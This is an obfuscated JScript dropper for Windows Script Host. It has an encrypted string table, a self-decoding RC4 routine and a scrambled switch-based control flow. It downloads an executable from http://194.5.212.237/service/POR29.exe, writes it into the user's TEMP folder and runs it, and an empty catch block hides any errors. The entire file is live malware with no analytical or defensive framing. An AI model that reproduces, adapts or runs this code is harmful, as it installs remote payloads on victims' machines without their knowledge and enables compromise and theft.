var a = ["ZcKpw4HDhsOUV2hFw45M", "f8OfFsOcSmbCpMKswr7CuX/CpMOp", "dwE/w7TCs8O4wqMBwpo4WcKoUw==", "wqrChQlrGcOTLcKvwpI2K8Ou", "V8KYwr3CpnfCpMOVwrfDqQYkw7TDs8OKPMOWNMKxw5VQawhcVsOmAcOXwq/DgcOGV3pAwoJVZcKMw5XCu8O3w5bDpcO9w77DssO6wqHCrHlfwqoJwo7DscOTSFE=", "XsKaw63Cj8K5en3DksKSH8K7d8KDBTXDpV/CicOr", "djMjZzfCv3rCpMOWwoHCpsK1", "wpnDlsKXRcOeWMOCaA==", "woZGRw==", "D8OnacOkPDTDgcKkw7nCoCzCtQ==", "GgUpcS3CtlrCp8OYwoHCt8Ovw7/Cj8Kh"];
! function(e, t) {
    ! function(t) {
        for (; --t;) e.push(e.shift())
    }(++t)
}(a, 142);
var b = function(e, t) {
    var c = a[e -= 0];
    if (void 0 === b.eOiEbz) {
        ! function() {
            var e;
            try {
                e = Function('return (function() {}.constructor("return this")( ));')()
            } catch (t) {
                e = window
            }
            e.atob || (e.atob = function(e) {
                for (var t, c, n = String(e).replace(/=+$/, ""), r = "", a = 0, o = 0; c = n.charAt(o++); ~c && (t = a % 4 ? 64 * t + c : c, a++ % 4) ? r += String.fromCharCode(255 & t >> (-2 * a & 6)) : 0) c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(c);
                return r
            })
        }();
        b.AAqqLo = function(e, t) {
            for (var c, n, r = [], a = 0, o = "", i = "", s = 0, u = (e = atob(e)).length; s < u; s++) i += "%" + ("00" + e.charCodeAt(s).toString(16)).slice(-2);
            for (e = decodeURIComponent(i), n = 0; n < 256; n++) r[n] = n;
            for (n = 0; n < 256; n++) a = (a + r[n] + t.charCodeAt(n % t.length)) % 256, c = r[n], r[n] = r[a], r[a] = c;
            n = 0, a = 0;
            for (var h = 0; h < e.length; h++) a = (a + r[n = (n + 1) % 256]) % 256, c = r[n], r[n] = r[a], r[a] = c, o += String.fromCharCode(e.charCodeAt(h) ^ r[(r[n] + r[a]) % 256]);
            return o
        }, b.nXXhBj = {}, b.eOiEbz = !0
    }
    var n = b.nXXhBj[e];
    return void 0 === n ? (void 0 === b.emsbut && (b.emsbut = !0), c = b.AAqqLo(c, t), b.nXXhBj[e] = c) : c = n, c
};
try {
    for (var keVqmg = b("0x6", "XK)8").split("|"), YtLrDp = 0;;) {
        switch (keVqmg[YtLrDp++]) {
            case "0":
                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                continue;
            case "1":
                shell[b("0x9", "pT#[")](filepath);
                continue;
            case "2":
                xhr.open("GET", "http://194.5.212.237/service/POR29.exe", !1);
                continue;
            case "3":
                xhr.send();
                continue;
            case "4":
                var filepath = WshShell.ExpandEnvironmentStrings("%TEMP%") + b("0x0", "qCFK");
                continue;
            case "5":
                var WshShell = WScript[b("0x7", "qCFK")](b("0x3", "Rq)D"));
                continue;
            case "6":
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                continue;
            case "7":
                if (0 == fso.FileExists(filepath))
                    for (var VmZOQS = b("0x2", "#DcY").split("|"), PvpJjM = 0;;) {
                        switch (VmZOQS[PvpJjM++]) {
                            case "0":
                                stream.Open();
                                continue;
                            case "1":
                                var stream = new ActiveXObject(b("0xa", "#DcY"));
                                continue;
                            case "2":
                                stream[b("0x1", "L!Uj")](filepath, 2);
                                continue;
                            case "3":
                                stream.Close();
                                continue;
                            case "4":
                                stream.Type = 1;
                                continue;
                            case "5":
                                stream[b("0x8", "tiaQ")] = 0;
                                continue;
                            case "6":
                                stream.Write(xhr[b("0x4", "tCyv")]);
                                continue
                        }
                        break
                    }
                continue;
            case "8":
                var shell = WScript.CreateObject("WScript.Shell");
                continue;
            case "9":
              
                continue
                case "10":
              
                    continue
        }
        break
    }
} catch (e) {}